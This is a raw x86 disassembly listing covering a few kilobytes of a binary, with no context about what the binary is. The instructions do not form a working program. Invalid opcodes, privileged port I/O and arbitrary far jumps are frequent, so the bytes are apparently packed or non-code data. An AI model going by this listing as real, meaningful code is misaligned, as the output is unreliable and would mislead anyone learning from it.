  408268:	adc    DWORD PTR cs:[edx+edx*4],esi
  40826c:	iret   
  40826d:	repz and eax,0x7d8099f7
  408273:	pushf  
  408274:	std    
  408275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408276:	test   eax,0x5f26fe2a
  40827b:	xor    eax,0x4794172e
  408280:	adc    al,0x7e
  408282:	jge    0x40822e
  408284:	icebp  
  408285:	xor    BYTE PTR [eax+edi*1-0x78],bh
  408289:	push   ds
  40828a:	clc    
  40828b:	jmp    0xabc9:0xfed4da
  408292:	push   edx
  408293:	inc    edi
  408294:	out    0xe0,eax
  408296:	jno    0x40827f
  408298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408299:	nop
  40829a:	addr16 fs data16 (bad) 
  40829e:	mov    ds:0xb8972f72,eax
  4082a3:	pushf  
  4082a4:	jmp    0x40831f
  4082a6:	and    BYTE PTR [ebp+edi*1+0x63806ddc],ch
  4082ad:	sbb    eax,0x6bb8aed
  4082b2:	repnz cmp ch,ch
  4082b5:	js     0x40823e
  4082b7:	mul    BYTE PTR ss:[esi+ebx*8-0x40]
  4082bc:	and    al,0x27
  4082be:	or     eax,0x85d845df
  4082c3:	push   ebp
  4082c4:	not    BYTE PTR [edi+0x5c249515]
  4082ca:	adc    eax,0x9868ff10
  4082cf:	in     eax,dx
  4082d0:	xchg   esp,eax
  4082d1:	aad    0x6a
  4082d3:	sub    al,0xaf
  4082d5:	jmp    0xc525:0x4482e18e
  4082dc:	scas   eax,DWORD PTR es:[edi]
  4082dd:	pop    ebx
  4082de:	ds sbb al,0x57
  4082e1:	mov    ebx,0x20fc5a2
  4082e6:	nop
  4082e7:	pop    eax
  4082e8:	icebp  
  4082e9:	mov    esp,0x672d79c0
  4082ee:	stos   BYTE PTR es:[edi],al
  4082ef:	pop    ebp
  4082f0:	in     al,0xd2
  4082f2:	dec    ecx
  4082f3:	loopne 0x40831c
  4082f5:	push   es
  4082f6:	mov    eax,ds:0x71561f65
  4082fb:	adc    al,0xe8
  4082fd:	popa   
  4082fe:	xchg   esi,eax
  4082ff:	neg    DWORD PTR [edx-0x1c368caa]
  408305:	test   DWORD PTR [ebx],0xb44e9744
  40830b:	inc    esi
  40830c:	mov    edx,0x9fb4ddbe
  408311:	inc    esp
  408312:	aam    0xa8
  408314:	inc    esp
  408315:	jle    0x408313
  408317:	sbb    eax,0x9fb83123
  40831c:	gs std 
  40831e:	out    0x10,al
  408320:	cs loope 0x4082cf
  408323:	jl     0x408346
  408325:	dec    esi
  408326:	dec    esp
  408327:	(bad)  
  408329:	push   edx
  40832a:	xor    cl,ah
  40832c:	pushf  
  40832d:	xchg   esi,eax
  40832e:	imul   edx,DWORD PTR [edi-0x42175e14],0x1a
  408335:	in     eax,dx
  408336:	mov    ah,BYTE PTR [edx+ebx*1-0x3dccc7af]
  40833d:	push   edx
  40833e:	ror    DWORD PTR [ebx+0xf90cdfa],0xd1
  408345:	rcl    BYTE PTR [edi],1
  408347:	cdq    
  408348:	sub    BYTE PTR [edi+eax*2],ah
  40834b:	xchg   DWORD PTR [edi+0x42512511],esp
  408351:	ja     0x4083bc
  408353:	jg     0x408331
  408355:	pop    esi
  408356:	inc    ebp
  408357:	jns    0x4083c2
  408359:	mov    ch,0x46
  40835b:	int3   
  40835c:	xchg   BYTE PTR [ecx-0x5bcd36b7],bh
  408362:	lods   eax,DWORD PTR ds:[esi]
  408363:	xlat   BYTE PTR ds:[ebx]
  408364:	add    BYTE PTR [esi],dh
  408366:	xor    dh,bh
  408368:	daa    
  408369:	adc    esp,edx
  40836b:	out    0x23,al
  40836d:	and    ch,BYTE PTR [ecx-0x67]
  408370:	jne    0x4083be
  408372:	xchg   edx,eax
  408373:	adc    BYTE PTR [ebx+0x79f1605d],0xcb
  40837a:	das    
  40837b:	aaa    
  40837c:	enter  0x9f72,0xdd
  408380:	push   0x58
  408382:	mov    WORD PTR [ebx-0x5d676cf4],fs
  408388:	mov    eax,ds:0xa478fd98
  40838d:	(bad)  
  40838e:	add    DWORD PTR [esi],0x2a36d5af
  408394:	ret    
  408395:	test   BYTE PTR [edx],dl
  408397:	sbb    al,0xe5
  408399:	ud0    esi,esp
  40839c:	adc    BYTE PTR ds:0x3bcb62c1,dl
  4083a2:	inc    ebp
  4083a3:	sbb    BYTE PTR [ecx-0x202f000a],0x3b
  4083aa:	mov    WORD PTR [ebx+0xb93a411],ss
  4083b0:	(bad)  
  4083b2:	sub    eax,0x28c80c8c
  4083b7:	xchg   ch,al
  4083b9:	mov    dh,0x31
  4083bb:	sub    ebp,DWORD PTR [edi+0x3a3bde1b]
  4083c1:	fnstsw WORD PTR [esi+0x5f8f2b9c]
  4083c7:	push   esp
  4083c8:	daa    
  4083c9:	les    esp,FWORD PTR [esi+0x50f60161]
  4083cf:	xchg   esp,eax
  4083d0:	pop    eax
  4083d1:	xor    edi,esp
  4083d3:	xchg   ebx,eax
  4083d4:	mov    cl,0x6c
  4083d6:	ret    0xa932
  4083d9:	inc    ebx
  4083da:	or     esi,ecx
  4083dc:	add    eax,0xe4b08979
  4083e1:	mov    cl,0xce
  4083e3:	iret   
  4083e4:	sar    eax,0x79
  4083e7:	out    dx,al
  4083e8:	mov    BYTE PTR [esp+esi*2+0x19347704],bh
  4083ef:	jns    0x4083e5
  4083f1:	fcomp  QWORD PTR [edi-0x41d25309]
  4083f7:	xor    ecx,DWORD PTR [eax]
  4083f9:	push   0xffffffe5
  4083fb:	fs jge 0x408397
  4083fe:	jle    0x408429
  408400:	xchg   ebx,eax
  408401:	test   DWORD PTR [edx-0x52],esi
  408404:	inc    eax
  408405:	mov    esi,0x200b49c9
  40840a:	(bad)  
  40840b:	rcr    DWORD PTR [ebx],1
  40840d:	es pop ss
  40840f:	rcl    BYTE PTR [ebx+edi*8+0x42],1
  408413:	and    esi,DWORD PTR [eax+eiz*8]
  408416:	fistp  QWORD PTR [edx-0x3c]
  408419:	xchg   ebx,eax
  40841a:	ds faddp st(5),st
  40841d:	jno    0x408498
  40841f:	fistp  DWORD PTR [eax+0x24ea1bd4]
  408425:	or     DWORD PTR [ebx+ecx*8+0x7d],esp
  408429:	(bad)  
  40842b:	lea    edi,[esi+esi*4]
  40842e:	sub    DWORD PTR [edx+0xf],esi
  408431:	shr    BYTE PTR [edi-0x35],0x7a
  408435:	ds inc edi
  408437:	mul    esi
  408439:	xchg   DWORD PTR [esi+0x735e3a7f],eax
  40843f:	mov    ah,0xfa
  408441:	sahf   
  408442:	stos   DWORD PTR es:[edi],eax
  408443:	fcmovnb st,st(3)
  408445:	mov    WORD PTR [ecx-0x11],cs
  408448:	dec    esp
  408449:	inc    ebp
  40844a:	mov    esp,0xa97ea816
  40844f:	outs   dx,BYTE PTR ds:[esi]
  408450:	adc    ecx,0xa43a8d94
  408456:	jmp    0x100d:0xda67fc70
  40845d:	loop   0x40843a
  40845f:	fisubr DWORD PTR [edi+ebx*4-0x39a78368]
  408466:	call   0x37b3:0xb6195fee
  40846d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40846e:	rol    esp,0xbb
  408471:	inc    esp
  408472:	dec    eax
  408473:	jbe    0x4084d1
  408475:	adc    al,0xa0
  408477:	pusha  
  408478:	les    ecx,FWORD PTR [edx]
  40847a:	div    DWORD PTR [ecx-0x7cae5a93]
  408480:	lds    edi,FWORD PTR [ebx]
  408482:	or     eax,0x242e3627
  408487:	xor    ah,BYTE PTR [edi-0x7d4ce659]
  40848d:	popa   
  40848e:	aad    0xd9
  408490:	sbb    eax,0x5905bc8
  408495:	into   
  408496:	test   DWORD PTR [ebp-0x11c0df8f],ebx
  40849c:	jns    0x4084bd
  40849e:	div    DWORD PTR ds:0x9412638d
  4084a4:	xchg   ecx,eax
  4084a5:	and    BYTE PTR [eax-0x8],bh
  4084a8:	out    dx,eax
  4084a9:	lods   eax,DWORD PTR ds:[esi]
  4084aa:	loop   0x408529
  4084ac:	add    BYTE PTR [edi+0x546877c4],ch
  4084b2:	inc    ecx
  4084b3:	leave  
  4084b4:	inc    edx
  4084b5:	es and edi,esi
  4084b8:	mov    edx,ebp
  4084ba:	scas   eax,DWORD PTR es:[edi]
  4084bb:	dec    edi
  4084bc:	and    bl,BYTE PTR [edi]
  4084be:	popf   
  4084bf:	or     eax,0x56fe44e6
  4084c4:	xchg   ebp,eax
  4084c5:	(bad)  
  4084c6:	iret   
  4084c7:	push   edi
  4084c8:	popa   
  4084c9:	outs   dx,DWORD PTR ds:[esi]
  4084ca:	adc    al,0x13
  4084cc:	dec    edi
  4084cd:	mov    dh,0x32
  4084cf:	rol    DWORD PTR [ebx],0xf8
  4084d2:	xchg   ebp,eax
  4084d3:	push   ebx
  4084d4:	xor    edi,DWORD PTR [ebp+edi*2-0x635b7519]
  4084db:	pop    es
  4084dc:	xchg   ebp,eax
  4084dd:	int3   
  4084de:	mov    al,0x2a
  4084e0:	and    ebp,edx
  4084e2:	mov    bl,0xaa
  4084e4:	out    dx,al
  4084e5:	in     eax,0xfd
  4084e7:	gs sahf 
  4084e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084ea:	loop   0x4084d2
  4084ec:	sbb    esi,DWORD PTR [ecx+0xcfb92d1]
  4084f2:	call   0x46cbfe50
  4084f7:	add    DWORD PTR [eax],edx
  4084f9:	or     dh,BYTE PTR [esi+0x26]
  4084fc:	push   ecx
  4084fd:	mov    ebp,0x189940e0
  408502:	call   0x5aa:0xac5a1fa
  408509:	test   al,0xa
  40850b:	addr16 inc esi
  40850d:	jne    0x408531
  40850f:	push   ss
  408510:	cld    
  408511:	sbb    eax,DWORD PTR [ebx+0x67f6a1da]
  408517:	int3   
  408518:	inc    esi
  408519:	daa    
  40851a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40851b:	cmp    ch,ch
  40851d:	fst    st(0)
  40851f:	jmp    0x4084b3
  408521:	push   0xc
  408523:	mov    ah,0x31
  408525:	(bad)  
  408526:	mov    dh,0xae
  408528:	jo     0x408519
  40852a:	fwait
  40852b:	xor    DWORD PTR [ecx],eax
  40852d:	pop    edx
  40852e:	push   esp
  40852f:	sub    ebx,DWORD PTR [ebx-0x7cafcb2c]
  408535:	mov    al,ds:0xa1fec99e
  40853a:	adc    ecx,eax
  40853c:	pop    ebx
  40853d:	mul    DWORD PTR [ecx+ebx*2]
  408540:	(bad)  
  408541:	xor    esp,DWORD PTR [ebp+0x5b]
  408544:	xor    eax,0x2c88aa10
  408549:	loopne 0x4084cc
  40854b:	(bad)  
  40854d:	sub    DWORD PTR [ebx-0x105b856f],esp
  408553:	clc    
  408554:	cmp    cl,bl
  408556:	adc    ecx,DWORD PTR [ebx-0x3fb0ce20]
  40855c:	inc    edi
  40855d:	jge    0x408571
  40855f:	inc    ebx
  408560:	out    dx,al
  408561:	mov    ecx,0xce361274
  408566:	xor    edx,edi
  408568:	pushf  
  408569:	outs   dx,DWORD PTR ds:[esi]
  40856a:	in     al,0x79
  40856c:	iret   
  40856d:	adc    edi,DWORD PTR [edi-0x1533daeb]
  408573:	lods   eax,DWORD PTR ds:[esi]
  408574:	mov    dh,0xd1
  408576:	pop    es
  408577:	xchg   ebp,eax
  408578:	cmp    ah,BYTE PTR [ebp+0x1f]
  40857b:	push   0xffffff82
  40857d:	int    0xe5
  40857f:	int3   
  408580:	out    0x21,eax
  408582:	cmp    DWORD PTR [edi-0x64cf450b],eax
  408588:	sbb    al,0xde
  40858a:	enter  0x52e6,0xc0
  40858e:	xchg   ecx,eax
  40858f:	add    ebx,esi
  408591:	iret   
  408592:	out    dx,eax
  408593:	in     al,0x84
  408595:	mov    esp,0x6fb4bf05
  40859a:	jno    0x40858e
  40859c:	sbb    al,0x46
  40859e:	push   0xdce496b7
  4085a3:	sti    
  4085a4:	pop    edx
  4085a5:	push   esi
  4085a6:	loopne 0x40854d
  4085a8:	test   eax,0xaab21758
  4085ad:	ins    BYTE PTR es:[edi],dx
  4085ae:	pushf  
  4085af:	inc    edi
  4085b0:	mov    ds:0xdf4f2933,eax
  4085b5:	sbb    bl,dl
  4085b7:	sbb    al,0xac
  4085b9:	outs   dx,DWORD PTR ds:[esi]
  4085ba:	inc    eax
  4085bb:	mov    eax,0xebff6b31
  4085c0:	popa   
  4085c1:	mov    edi,0xb5881e20
  4085c6:	loopne 0x4085b3
  4085c8:	xchg   edx,eax
  4085c9:	push   ecx
  4085ca:	mov    eax,0x9eb08d92
  4085cf:	jge    0x40858b
  4085d1:	fcomp  QWORD PTR [esi+0x5]
  4085d4:	jnp    0x4085bd
  4085d6:	enter  0x8bd6,0xca
  4085da:	fistp  DWORD PTR [eax-0x11a89c1e]
  4085e0:	add    esp,ecx
  4085e2:	push   edx
  4085e3:	js     0x4085e1
  4085e5:	in     al,0x5e
  4085e7:	scas   eax,DWORD PTR es:[edi]
  4085e8:	jecxz  0x4085b3
  4085ea:	popf   
  4085eb:	mov    ah,0xc1
  4085ed:	mov    dl,0x67
  4085ef:	pop    ebp
  4085f0:	or     al,0x7c
  4085f2:	fs mov esi,0xfb05af78
  4085f8:	fldenv [eax+0x7b92707e]
  4085fe:	jno    0x4085bb
  408600:	ror    BYTE PTR [ebp+0x65],1
  408603:	outs   dx,DWORD PTR ds:[esi]
  408604:	mov    dl,0xfb
  408606:	push   ss
  408607:	fcom   DWORD PTR [ecx]
  408609:	xor    al,0x5
  40860b:	mov    ebx,0x11c7e312
  408610:	mov    ebp,0x707430a5
  408615:	frstor [eax+0x7]
  408618:	nop
  408619:	ror    DWORD PTR [ebp+0x3cf63497],1
  40861f:	xor    ah,BYTE PTR [ecx]
  408621:	(bad)
  408625:	pop    edi
  408626:	cmp    eax,0x25cc518
  40862b:	rcr    BYTE PTR [edx+0x32],1
  40862e:	push   edx
  40862f:	repnz in eax,dx
  408631:	mov    al,0xd0
  408633:	fist   WORD PTR [ecx+0x55]
  408636:	jb     0x408651
  408638:	mov    dh,0x38
  40863a:	adc    eax,0xdfb95fd7
  40863f:	fbstp  TBYTE PTR [edi-0x14cf0d2e]
  408645:	fdivr  QWORD PTR [esi]
  408647:	ins    DWORD PTR es:[edi],dx
  408648:	addr16 pop ebp
  40864a:	push   esi
  40864b:	or     dh,BYTE PTR [ecx+0x240d54e6]
  408651:	addr16 or bl,dl
  408654:	push   0xcabd0ce9
  408659:	aas    
  40865a:	fadd   DWORD PTR [edi+ebx*8+0x67]
  40865e:	or     al,0x3f
  408660:	js     0x408666
  408662:	fs nop
  408664:	daa    
  408665:	ins    DWORD PTR es:[edi],dx
  408666:	fsub   DWORD PTR [eax-0x707736e3]
  40866c:	mov    cl,0x95
  40866e:	mov    BYTE PTR ds:0x6b012234,bl
  408674:	popf   
  408675:	test   eax,0x51edf308
  40867a:	in     eax,dx
  40867b:	test   eax,0x16ae065e
  408680:	or     ebx,edx
  408682:	test   eax,0x826f11f4
  408687:	sbb    eax,0x7d85d4c3
  40868c:	enter  0x72fc,0x39
  408690:	and    edi,eax
  408692:	mov    ebp,0x601fe17
  408697:	(bad)  
  408699:	pop    esi
  40869a:	mov    bh,0xc2
  40869c:	arpl   WORD PTR [ecx],di
  40869e:	push   ebx
  40869f:	inc    esi
  4086a0:	daa    
  4086a1:	je     0x408686
  4086a3:	dec    esp
  4086a4:	mov    esi,0xecac9d07
  4086a9:	add    DWORD PTR [esp+ebp*2+0x477ff84d],0xdcc61a89
  4086b4:	adc    ch,al
  4086b6:	mov    BYTE PTR [edi-0x12],bl
  4086b9:	jle    0x4086b5
  4086bb:	test   DWORD PTR [ecx-0x5a54d2a5],edi
  4086c1:	jge    0x408648
  4086c3:	retf   
  4086c4:	test   al,0x20
  4086c6:	aaa    
  4086c7:	repz jb 0x4086bb
  4086ca:	sti    
  4086cb:	retf   
  4086cc:	js     0x4086f0
  4086ce:	pushf  
  4086cf:	aas    
  4086d0:	xor    BYTE PTR [ebx-0x7a96b7ac],0xa6
  4086d7:	jmp    0x1ac34c2a
  4086dc:	sbb    al,0xaa
  4086de:	(bad)  
  4086df:	dec    edi
  4086e0:	xchg   edx,eax
  4086e1:	outs   dx,BYTE PTR ds:[esi]
  4086e2:	sub    al,0xd
  4086e4:	jae    0x4086c2
  4086e6:	mov    edi,0x21db8731
  4086eb:	sbb    DWORD PTR [edi+ecx*1+0x73007ed0],ebx
  4086f2:	xchg   DWORD PTR [ebx+0x24c1953],edx
  4086f8:	je     0x40868e
  4086fa:	jecxz  0x4086dc
  4086fc:	inc    ebx
  4086fd:	inc    ecx
  4086fe:	repnz inc eax
  408700:	lods   eax,DWORD PTR ds:[esi]
  408701:	and    eax,DWORD PTR es:[ebp-0x2e94797d]
  408708:	mov    bl,0x84
  40870a:	in     al,0xd3
  40870c:	repz leave 
  40870e:	popf   
  40870f:	cmp    edx,ebp
  408711:	inc    edi
  408712:	adc    esp,DWORD PTR [ebx]
  408714:	daa    
  408715:	inc    esp
  408716:	jmp    0x381:0x5987c835
  40871d:	fdivr  DWORD PTR [edi-0x3066d953]
  408723:	test   eax,0xa62d3f43
  408728:	inc    edi
  408729:	outs   dx,BYTE PTR ds:[esi]
  40872a:	inc    ecx
  40872b:	popa   
  40872c:	dec    edx
  40872e:	cwde   
  40872f:	jle    0x408789
  408731:	stos   DWORD PTR es:[edi],eax
  408732:	je     0x408722
  408734:	stos   BYTE PTR es:[edi],al
  408735:	ins    BYTE PTR es:[edi],dx
  408736:	mov    eax,0x5ffc4e7a
  40873b:	cli    
  40873c:	rol    DWORD PTR [ebp+0x50a167cb],cl
  408742:	test   BYTE PTR [edx+0x68daaf63],dh
  408748:	mov    ah,0xd
  40874a:	cmovb  esp,edx
  40874d:	in     al,dx
  40874e:	sub    eax,0x8bd8e2b6
  408753:	repz lahf 
  408755:	sub    al,ch
  408757:	ins    BYTE PTR es:[edi],dx
  408758:	cmp    DWORD PTR [edx-0x4f],esp
  40875b:	inc    ecx
  40875c:	pop    ebp
  40875d:	in     eax,0xf9
  40875f:	add    DWORD PTR [edi+0x689d67ca],eax
  408765:	fwait
  408766:	inc    esp
  408767:	pop    eax
  408768:	inc    edx
  408769:	fsub   DWORD PTR [ecx]
  40876b:	in     eax,0xdc
  40876d:	aas    
  40876e:	in     eax,0x80
  408770:	outs   dx,BYTE PTR ds:[esi]
  408771:	cmp    al,0x96
  408773:	cmp    DWORD PTR [ebp+ebp*8-0x5ad2c38c],edi
  40877a:	pop    eax
  40877b:	mov    ebx,DWORD PTR gs:[esp+edx*4-0x79]
  408780:	mov    esp,0xa44895bc
  408785:	imul   esi,DWORD PTR [esi],0x793e550
  40878b:	dec    ebx
  40878c:	push   0xfffffff9
  40878e:	dec    esp
  40878f:	pop    edx
  408790:	pop    es
  408791:	cmc    
  408792:	mov    eax,ds:0x596c17fe
  408797:	inc    ecx
  408798:	(bad)  
  408799:	sar    edi,1
  40879b:	dec    edx
  40879c:	cmp    dl,BYTE PTR [edx-0xa23628c]
  4087a2:	cli    
  4087a3:	mov    bh,0x79
  4087a5:	add    DWORD PTR [edx-0x2db35948],ecx
  4087ab:	sub    eax,0x65f2191b
  4087b0:	icebp  
  4087b1:	cmp    ah,BYTE PTR [ecx]
  4087b3:	loop   0x4087d9
  4087b5:	ficomp DWORD PTR [eax+0x3b]
  4087b8:	fsub   DWORD PTR [ebp-0x13]
  4087bb:	and    DWORD PTR [edi-0x2d],esi
  4087be:	mov    ds:0x7d88cd6a,eax
  4087c3:	cmp    eax,0x83b2b797
  4087c8:	mov    DWORD PTR [ecx],ebx
  4087ca:	into   
  4087cb:	ins    DWORD PTR es:[edi],dx
  4087cc:	sbb    DWORD PTR [esi+0x760355d],edx
  4087d2:	pop    ebx
  4087d3:	ja     0x4087ec
  4087d5:	scas   eax,DWORD PTR es:[edi]
  4087d6:	push   cs
  4087d7:	int3   
  4087d8:	push   edx
  4087d9:	jmp    DWORD PTR [ebx+edx*4]
  4087dc:	loope  0x408840
  4087de:	add    DWORD PTR [ecx+0x16],ebp
  4087e1:	and    dh,ch
  4087e3:	dec    eax
  4087e4:	push   ebp
  4087e5:	inc    edi
  4087e6:	adc    DWORD PTR [edx+0x16],esi
  4087e9:	stc    
  4087ea:	shl    BYTE PTR [ebx+0x51],0x9
  4087ee:	mov    eax,0xe3d3b4b4
  4087f3:	mov    ebp,0x3da9b4a9
  4087f8:	or     ecx,DWORD PTR [edi-0x41]
  4087fb:	inc    ebp
  4087fc:	sbb    eax,0xb0b7274a
  408801:	aad    0x72
  408803:	mov    WORD PTR [ebx-0x100ec15],cs
  408809:	xor    BYTE PTR [edi-0x5],0x88
  40880d:	jg     0x408856
  40880f:	sbb    BYTE PTR [eax-0x1b],0x3a
  408813:	retf   0xb5db
  408816:	cdq    
  408817:	retf   0xe117
  40881a:	clc    
  40881b:	(bad)  cs:[ecx-0x6d]
  40881f:	jmp    0x2150ef26
  408824:	dec    esi
  408825:	pop    es
  408826:	mov    bh,0xbb
  408828:	mov    ah,0x3d
  40882a:	(bad)  
  40882b:	jns    0x408816
  40882d:	loop   0x4088a9
  40882f:	in     eax,0x83
  408831:	mov    ah,0x44
  408833:	repnz pushf 
  408835:	pop    edi
  408836:	test   al,0x84
  408838:	jo     0x408816
  40883a:	jne    0x408865
  40883c:	pcmpeqw mm2,QWORD PTR [ebp+ecx*2-0x79]
  408841:	jnp    0x408878
  408843:	inc    eax
  408844:	mov    esi,edx
  408846:	out    dx,eax
  408847:	or     BYTE PTR [eax+0x4f],0xe8
  40884b:	aam    0xb1
  40884d:	inc    esp
  40884e:	and    bl,bl
  408850:	pushf  
  408851:	call   0xa9a827e
  408856:	xchg   ebp,eax
  408857:	je     0x4088b8
  408859:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40885b:	mov    eax,0x5466daa2
  408860:	push   ebp
  408861:	push   eax
  408862:	push   cs
  408863:	mov    ebx,0x458581a0
  408868:	loope  0x40885a
  40886a:	cdq    
  40886b:	icebp  
  40886c:	call   0x44d0e48d
  408871:	cs retf 
  408873:	repnz adc BYTE PTR [edi+0x919f506],dh
  40887a:	xor    ah,dh
  40887c:	loop   0x408813
  40887e:	mov    edx,0x99c50b1
  408883:	(bad)  
  408884:	test   ebx,ebp
  408886:	and    cl,ch
  408888:	dec    ecx
  408889:	push   esp
  40888a:	mov    ebp,0x3c659018
  40888f:	(bad)  
  408890:	pop    ds
  408891:	dec    esp
  408892:	loopne 0x408838
  408894:	xor    al,0xae
  408897:	stos   DWORD PTR es:[edi],eax
  408898:	push   edi
  408899:	pop    edx
  40889a:	jae    0x40889b
  40889c:	leave  
  40889d:	int    0x20
  40889f:	mov    bl,dh
  4088a1:	xchg   edx,eax
  4088a2:	sub    al,0xf8
  4088a4:	(bad)  
  4088a5:	dec    ebx
  4088a6:	xchg   ebx,eax
  4088a7:	clc    
  4088a8:	push   edi
  4088a9:	mov    al,ds:0x6c3d3d0b
  4088ae:	adc    BYTE PTR [edx],bl
  4088b0:	rol    DWORD PTR [ebp+eax*1-0xd],1
  4088b4:	and    eax,0x4f7d77c1
  4088b9:	hlt    
  4088ba:	sbb    bl,ch
  4088bc:	loope  0x40890b
  4088be:	adc    eax,ebx
  4088c0:	dec    ebp
  4088c1:	fldenv [edi-0x49]
  4088c4:	sti    
  4088c5:	int    0x31
  4088c7:	enter  0x288a,0x14
  4088cb:	lods   eax,DWORD PTR ds:[esi]
  4088cc:	push   ecx
  4088cd:	inc    eax
  4088ce:	rcl    BYTE PTR [ebp+0x4de2b0a7],1
  4088d4:	jp     0x4088e1
  4088d6:	xchg   esi,eax
  4088d7:	and    al,0x37
  4088d9:	ds sbb eax,0x7375cb26
  4088df:	repz push edi
  4088e1:	fwait
  4088e2:	cs jle 0x40888c
  4088e5:	xchg   edi,eax
  4088e6:	dec    ebp
  4088e7:	test   DWORD PTR [edi-0x32a5c7d4],edx
  4088ed:	daa    
  4088ee:	mov    ebx,0xb98921d0
  4088f3:	mov    ch,BYTE PTR [edi-0x6fdd187f]
  4088f9:	arpl   WORD PTR [ecx+0x4669b830],cx
  4088ff:	and    BYTE PTR [ecx+0x30],ah
  408902:	test   eax,0x7961683e
  408907:	mov    al,ds:0x5f3107ac
  40890c:	inc    ebx
  40890d:	imul   edx,DWORD PTR [ecx],0xf
  408910:	test   eax,0x5c6bc669
  408915:	fistp  QWORD PTR ds:0x24d4df73
  40891b:	call   0x22e46aed
  408920:	jl     0x4088c5
  408922:	int    0x77
  408924:	xchg   edx,eax
  408925:	imul   ebp,DWORD PTR [ecx-0xe],0x61f4106d
  40892c:	nop
  40892d:	sti    
  40892e:	mov    ds:0xa9643ef,al
  408933:	pop    ebx
  408934:	pop    ss
  408935:	cmp    al,0x3e
  408937:	pop    eax
  408938:	add    eax,0x3cf8b028
  40893d:	xchg   DWORD PTR [eax+0xdee3006],ecx
  408943:	mov    bl,BYTE PTR [ecx+0x45]
  408946:	push   ss
  408947:	mov    dl,0x5
  408949:	mov    ebp,ds
  40894b:	adc    bh,dl
  40894d:	or     eax,0x55cce022
  408952:	pop    ebp
  408953:	iret   
  408954:	and    edx,DWORD PTR [ecx]
  408956:	das    
  408957:	add    DWORD PTR [eax+edx*4-0x1f],eax
  40895b:	(bad)  
  40895c:	fucom  st(1)
  40895e:	xlat   BYTE PTR ds:[ebx]
  40895f:	cs (bad) 
  408961:	shl    DWORD PTR [ecx-0x64],cl
  408964:	and    BYTE PTR [ebp-0x41],0x54
  408968:	data16 repnz or bl,BYTE PTR [eax]
  40896c:	jo     0x4088fe
  40896e:	inc    edx
  40896f:	xlat   BYTE PTR ds:[ebx]
  408970:	les    edx,FWORD PTR es:[ecx+0x7e]
  408974:	nop
  408975:	push   eax
  408976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408977:	mov    WORD PTR [esi+eiz*8+0x7f],ds
  40897b:	(bad)  
  40897c:	in     eax,dx
  40897d:	jmp    0x408930
  40897f:	cmp    al,0xe1
  408981:	xlat   BYTE PTR ds:[ebx]
  408982:	mov    ecx,0x34381695
  408987:	dec    edx
  408988:	xchg   ebx,eax
  408989:	lock adc BYTE PTR [esi-0x2d11e18b],al
  408990:	mov    cl,0x63
  408992:	inc    edi
  408993:	mov    edx,0x6504856b
  408998:	aaa    
  408999:	cmp    ebp,DWORD PTR [ebx+0x6bcd8d4a]
  40899f:	mov    al,ds:0xb4b3a5db
  4089a4:	mov    DWORD PTR [esp+edx*8-0x315cb3f],0x5e570691
  4089af:	std    
  4089b0:	out    0x82,eax
  4089b2:	inc    ebp
  4089b3:	dec    esi
  4089b4:	add    eax,0xc17044f4
  4089b9:	test   al,0x41
  4089bb:	adc    esp,DWORD PTR [ebx+0x40cf35e1]
  4089c1:	mov    ch,0x1a
  4089c3:	cmp    BYTE PTR [eax],ah
  4089c5:	pop    ecx
  4089c6:	aam    0xb6
  4089c8:	shl    BYTE PTR [edx+0x20a6a1df],0xb8
  4089cf:	cmp    DWORD PTR [ecx],edx
  4089d1:	jmp    0x42eb:0x95a0caf4
  4089d8:	lea    esp,[edi]
  4089da:	cmp    al,0xa5
  4089dc:	mov    eax,0x7cd2ee6c
  4089e1:	aaa    
  4089e2:	popf   
  4089e3:	hlt    
  4089e4:	fcmovbe st,st(5)
  4089e6:	jg     0x4089ae
  4089e8:	ret    0xf3ef
  4089eb:	or     eax,0xf4f1ae29
  4089f0:	(bad)  
  4089f1:	push   eax
  4089f2:	jb     0x4089af
  4089f4:	pop    es
  4089f5:	cwde   
  4089f6:	mov    bl,0xe8
  4089f8:	dec    edi
  4089f9:	fnstsw WORD PTR [eax+0x20]
  4089fc:	cli    
  4089fd:	es inc esp
  4089ff:	and    bh,bl
  408a01:	test   al,0x4
  408a03:	sbb    DWORD PTR [edi+0x14],esi
  408a06:	shr    DWORD PTR [edx-0x434f11f1],0xc
  408a0d:	push   0xfd956d9f
  408a12:	xor    DWORD PTR [eax+0x52597273],edx
  408a18:	stos   BYTE PTR es:[edi],al
  408a19:	out    0x5f,eax
  408a1b:	xor    dh,BYTE PTR [edx+0x4679518a]
  408a21:	inc    edx
  408a22:	cld    
  408a23:	imul   esi,DWORD PTR ds:0xae23061c,0xffffff97
  408a2a:	adc    al,0xb7
  408a2c:	loope  0x408aac
  408a2e:	xor    eax,0x201a027e
  408a33:	iret   
  408a34:	(bad)  
  408a35:	cli    
  408a36:	sar    BYTE PTR [edi+0x1e39a87b],cl
  408a3c:	mov    ebx,0x2ac1429c
  408a41:	or     BYTE PTR [ebp+0x199715],ah
  408a47:	(bad)  
  408a48:	iret   
  408a49:	push   esi
  408a4a:	sbb    DWORD PTR [ebx-0x56],ebp
  408a4d:	fnstenv [edi-0x12b58303]
  408a53:	imul   esp,DWORD PTR [edx],0xd2461b00
  408a59:	pusha  
  408a5a:	adc    DWORD PTR [ecx],edx
  408a5c:	popa   
  408a5d:	cli    
  408a5e:	pop    es
  408a5f:	gs fwait
  408a61:	addr16 loop 0x408a12
  408a64:	dec    esi
  408a65:	pop    es
  408a66:	sub    dl,BYTE PTR [eax+ebx*8-0xa]
  408a6a:	jge    0x408a08
  408a6c:	xor    al,0xbe
  408a6e:	repz clc 
  408a70:	and    al,0x96
  408a72:	stc    
  408a73:	or     eax,0x5ecaae7a
  408a78:	mov    dl,0x67
  408a7a:	push   edx
  408a7b:	pushf  
  408a7c:	pop    es
  408a7d:	pop    ebp
  408a7e:	scas   eax,DWORD PTR es:[edi]
  408a7f:	mov    eax,ds:0x5dd5b1d8
  408a84:	cmp    BYTE PTR [eax+0x3f5e7593],dl
  408a8a:	mov    dh,0xc3
  408a8c:	add    bl,0x48
  408a8f:	mov    ?,edi
  408a91:	mov    dh,BYTE PTR [edi+0x3ebffa0f]
  408a97:	sti    
  408a98:	mov    bh,0x9b
  408a9b:	test   BYTE PTR ds:0x8ce3ca60,bl
